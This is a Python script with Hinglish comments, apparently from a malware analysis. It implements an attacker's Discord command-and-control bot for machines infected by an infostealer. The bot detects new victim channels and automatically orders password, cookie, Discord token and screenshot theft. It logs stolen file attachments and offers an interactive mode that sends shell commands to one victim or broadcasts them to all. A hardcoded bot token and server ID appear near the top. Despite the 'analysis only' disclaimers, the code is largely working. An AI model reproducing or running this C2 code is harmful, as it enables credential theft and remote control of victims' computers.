# ============================================================================
# 🎮 ATTACKER KA DISCORD BOT — Victims manage karne ke liye
# ============================================================================
#
# IMPORTANT: Is malware mein attacker ko ALAG BOT SCRIPT ki zaroorat NAHI hai!
# Attacker SIRF Discord app mein jaake commands type karta hai.
#
# LEKIN — agar attacker chahein toh ek Python bot bana sakte hain
# jo automatically victims manage kare. Neeche woh code hai
# (educational/analysis purpose ke liye)
#
# YEH SCRIPT MALWARE KA HISSA NAHI HAI — yeh sirf dikhata hai ki
# attacker kaise automate kar sakta hai
#
# ⚠️ SIRF ANALYSIS KE LIYE — RUN MAT KARNA
# ============================================================================

# ============================================================================
# EXPLANATION: Attacker ka 2 tarike hain victims control karne ke:
#
# METHOD 1 (Jo malware mein hai): MANUAL
#   - Attacker apna Discord app kholte hai
#   - #victim-noxy-pc channel mein jaate hai
#   - !pw type karte hai
#   - Bot (malware) reply mein passwords.txt bhejta hai
#   - Bas. Itna simple hai.
#
# METHOD 2 (Advanced): AUTOMATED BOT
#   - Attacker ek Python bot chalata hai
#   - Bot automatically nayi victims detect karta hai
#   - Bot automatically passwords/tokens chura leta hai
#   - Attacker ko sirf results dekhne hote hain
#
# Neeche Method 2 ka code hai (PSEUDO-CODE — educational only):
# ============================================================================

import discord      # discord.py library
import asyncio
import json
from datetime import datetime

# ============================================================================
# CONFIG — Same credentials jo malware mein hardcoded hain
# ============================================================================
BOT_TOKEN = "MTUzMTY1MzUxNjgzNjMzOTkxMg.G4oguX.etFcTqjXGIQ6j5fEZSflhY8tGa6YlxM4jX-sPw"
GUILD_ID = 1531656072778092656

# ============================================================================
# Yeh bot victim channels monitor karta hai aur commands bhejta hai
# ============================================================================

# Discord bot ka intents setup
intents = discord.Intents.default()
intents.message_content = True      # Messages padh sake
intents.guilds = True               # Server info access
intents.guild_messages = True       # Server messages access

bot = discord.Client(intents=intents)

# ============================================================================
# JAB BOT READY HO
# ============================================================================
@bot.event
async def on_ready():
    """
    Bot start hone pe:
    - Saari victim channels list karo
    - Har ek se !info maango
    """
    print(f"[+] Bot logged in as {bot.user}")
    print(f"[+] Connected to {len(bot.guilds)} servers")
    
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("[-] Guild not found!")
        return
    
    # Saare "victim-" channels dhundho
    victim_channels = [
        ch for ch in guild.text_channels 
        if ch.name.startswith("victim-")
    ]
    
    print(f"\n[*] Found {len(victim_channels)} victims:")
    print("=" * 50)
    for ch in victim_channels:
        # Channel ka naam = victim ka computer naam
        # e.g. "victim-noxy-pc" → NOXY-PC
        hostname = ch.name.replace("victim-", "").upper()
        print(f"  📌 {hostname} → #{ch.name} (ID: {ch.id})")
    print("=" * 50)

# ============================================================================
# NAYI VICTIM DETECT KARO
# ============================================================================
@bot.event
async def on_guild_channel_create(channel):
    """
    Jab nayi channel bane (= nayi victim infected hui):
    - Notification bhejo
    - Automatically passwords aur tokens maango
    """
    if not channel.name.startswith("victim-"):
        return
    
    hostname = channel.name.replace("victim-", "").upper()
    print(f"\n🚨 NEW VICTIM DETECTED: {hostname}")
    print(f"   Channel: #{channel.name}")
    print(f"   Time: {datetime.now()}")
    
    # 60 seconds wait karo (malware ko initialize hone do)
    await asyncio.sleep(60)
    
    # Automatically data maango:
    # Yeh messages channel mein jaayengi
    # Malware inhe padhegi aur execute karegi
    
    print(f"[*] Auto-collecting data from {hostname}...")
    
    # 1. System info maango
    await channel.send("!info")
    await asyncio.sleep(5)
    
    # 2. Passwords maango
    await channel.send("!pw")
    await asyncio.sleep(10)
    
    # 3. Cookies maango
    await channel.send("!cookies")
    await asyncio.sleep(10)
    
    # 4. Discord tokens maango
    await channel.send("!steal_tokens")
    await asyncio.sleep(5)
    
    # 5. Screenshot lo
    await channel.send("!screenshot")
    
    print(f"[+] Auto-collection commands sent to {hostname}")

# ============================================================================
# MESSAGES MONITOR KARO
# ============================================================================
@bot.event
async def on_message(message):
    """
    Jab koi message aaye:
    - Agar bot ka message hai (malware ka response) → log karo
    - Agar file attachment hai → save karo
    """
    # Apne messages ignore karo
    if message.author == bot.user:
        return
    
    # Sirf victim channels ke messages
    if not message.channel.name.startswith("victim-"):
        return
    
    hostname = message.channel.name.replace("victim-", "").upper()
    
    # Beacon message (nayi victim online aayi)
    if message.content.startswith("Beacon:"):
        print(f"\n📡 BEACON from {hostname}:")
        print(f"   {message.content}")
    
    # File attachments (passwords, screenshots, etc.)
    if message.attachments:
        for attachment in message.attachments:
            filename = attachment.filename
            print(f"\n📎 FILE from {hostname}: {filename}")
            print(f"   Size: {attachment.size} bytes")
            print(f"   URL: {attachment.url}")
            
            # File download karo local mein
            # (attacker apne PC pe save karta hai)
            # await attachment.save(f"loot/{hostname}/{filename}")
    
    # Text responses
    if message.content and not message.content.startswith("Beacon:"):
        print(f"\n💬 {hostname}: {message.content}")

# ============================================================================
# INTERACTIVE COMMAND SENDER
# ============================================================================
# Yeh function attacker ko terminal se commands bhejne deta hai
# Input: "noxy-pc !shell whoami"
# → #victim-noxy-pc channel mein "!shell whoami" bhejta hai
# ============================================================================
async def interactive_mode():
    """Terminal se commands bhejo"""
    await bot.wait_until_ready()
    guild = bot.get_guild(GUILD_ID)
    
    print("\n" + "=" * 60)
    print("INTERACTIVE MODE")
    print("Format: <hostname> <command>")
    print("Example: noxy-pc !pw")
    print("Type 'list' to see all victims")
    print("Type 'broadcast <cmd>' to send to ALL victims")
    print("=" * 60)
    
    while True:
        # User input lo
        # (Real implementation mein asyncio.to_thread use hota)
        user_input = await asyncio.to_thread(input, "\n⚡ > ")
        
        if user_input.strip() == "list":
            # Saari victims list karo
            for ch in guild.text_channels:
                if ch.name.startswith("victim-"):
                    print(f"  📌 {ch.name}")
            continue
        
        if user_input.startswith("broadcast "):
            # Sab victims ko ek saath command bhejo
            cmd = user_input[10:]
            for ch in guild.text_channels:
                if ch.name.startswith("victim-"):
                    await ch.send(cmd)
                    print(f"  → Sent to #{ch.name}")
            continue
        
        # Format: "noxy-pc !pw"
        parts = user_input.split(" ", 1)
        if len(parts) < 2:
            print("Format: <hostname> <command>")
            continue
        
        target = f"victim-{parts[0].lower()}"
        command = parts[1]
        
        # Channel dhundho
        channel = discord.utils.get(guild.text_channels, name=target)
        if not channel:
            print(f"[-] Channel #{target} not found!")
            continue
        
        # Command bhejo
        await channel.send(command)
        print(f"[+] Sent '{command}' to #{target}")

# ============================================================================
# BOT START KARO
# ============================================================================
# Attacker yeh script chalata hai → bot connect hota hai → victims control mein
#
# YAAD RAKH: Yeh script OPTIONAL hai!
# Attacker BINA is script ke bhi sirf Discord app mein jaake
# manually commands type kar sakta hai. Yeh script sirf
# automation ke liye hai.
# ============================================================================

 bot.loop.create_task(interactive_mode)
 bot.run(BOT_TOKEN)

# ============================================================================
# ⚠️ YEH SCRIPT SIRF ANALYSIS KE LIYE HAI
# ============================================================================
# Is script ko run karne se:
# 1. Discord Terms of Service violate hoti hai
# 2. Computer crime laws violate hote hain
# 3. Jail ho sakti hai (IT Act Section 66, 66C, 66D, 43)
#
# Yeh document sirf yeh samjhane ke liye hai ki malware kaise kaam karta hai
# ============================================================================
